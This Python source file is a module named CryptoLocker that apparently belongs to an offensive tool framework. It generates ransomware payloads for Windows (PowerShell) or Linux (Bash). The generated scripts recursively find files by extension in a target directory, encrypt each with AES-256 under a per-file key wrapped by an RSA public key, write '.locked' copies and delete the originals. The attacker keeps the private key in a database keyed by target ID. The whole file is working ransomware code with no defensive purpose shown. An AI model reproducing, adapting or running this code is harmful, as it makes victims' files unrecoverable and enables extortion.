from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from sqlmodel import Session

from backend.models.key_store import KeyStore
from .base_module import BaseModule


class CryptoLocker(BaseModule):
    """RSA-2048 + AES hybrid-encryption payload generator."""

    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        target_directory: str = params.get("target_directory", "/tmp")
        file_extensions: list[str] = params.get("file_extensions", [".txt", ".pdf", ".docx"])

        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()

        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()

        priv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()

        ks = KeyStore(
            target_id=target_id,
            public_key_pem=pub_pem,
            private_key_pem=priv_pem,
        )
        session.add(ks)
        session.flush()

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            script = self._build_ps_script(pub_pem, target_directory, file_extensions)
            return self._wrap_powershell(script)
        else:
            script = self._build_bash_script(pub_pem, target_directory, file_extensions)
            return self._wrap_bash(script)

    @staticmethod
    def _build_ps_script(pub_pem: str, target_dir: str, extensions: list[str]) -> str:
        ext_filter = " -or ".join(
            [f'$_.Extension -eq "{ext}"' for ext in extensions]
        )
        return f'''
$pubPem = @"
{pub_pem.strip()}
"@

$pubBytes = [System.Text.Encoding]::UTF8.GetBytes($pubPem)
$pemString = [System.Text.Encoding]::UTF8.GetString($pubBytes)
$pemLines = $pemString -split "`n" | Where-Object {{ $_ -notmatch "BEGIN|END" }} | ForEach-Object {{ $_.Trim() }}
$derBytes = [Convert]::FromBase64String(($pemLines -join ""))
$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportSubjectPublicKeyInfo($derBytes, [ref]$null)

$targetDir = "{target_dir}"
$files = Get-ChildItem -Path $targetDir -Recurse -File | Where-Object {{ {ext_filter} }}

foreach ($f in $files) {{
    try {{
        $data = [System.IO.File]::ReadAllBytes($f.FullName)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.GenerateKey()
        $aes.GenerateIV()
        $encryptor = $aes.CreateEncryptor()
        $encData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
        $encKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
        $blob = New-Object byte[] ($encKey.Length + $aes.IV.Length + $encData.Length)
        [Array]::Copy($encKey, 0, $blob, 0, $encKey.Length)
        [Array]::Copy($aes.IV, 0, $blob, $encKey.Length, $aes.IV.Length)
        [Array]::Copy($encData, 0, $blob, $encKey.Length + $aes.IV.Length, $encData.Length)
        [System.IO.File]::WriteAllBytes($f.FullName + ".locked", $blob)
        Remove-Item -Force $f.FullName
    }} catch {{ }}
}}
'''

    @staticmethod
    def _build_bash_script(pub_pem: str, target_dir: str, extensions: list[str]) -> str:
        find_expr = " -o ".join([f'-name "*{ext}"' for ext in extensions])
        return f'''#!/bin/bash
PUB_PEM=$(mktemp)
cat > "$PUB_PEM" << 'PUBKEY'
{pub_pem.strip()}
PUBKEY

find "{target_dir}" -type f \\( {find_expr} \\) | while IFS= read -r file; do
    AES_KEY=$(openssl rand -hex 32)
    AES_IV=$(openssl rand -hex 16)
    openssl enc -aes-256-cbc -in "$file" -out "${{file}}.locked" -K "$AES_KEY" -iv "$AES_IV" 2>/dev/null
    echo -n "$AES_KEY" | xxd -r -p | openssl rsautl -encrypt -pubin -inkey "$PUB_PEM" -oaep > "${{file}}.locked.meta" 2>/dev/null
    echo "$AES_IV" >> "${{file}}.locked.meta"
    rm -f "$file"
done

rm -f "$PUB_PEM"
'''
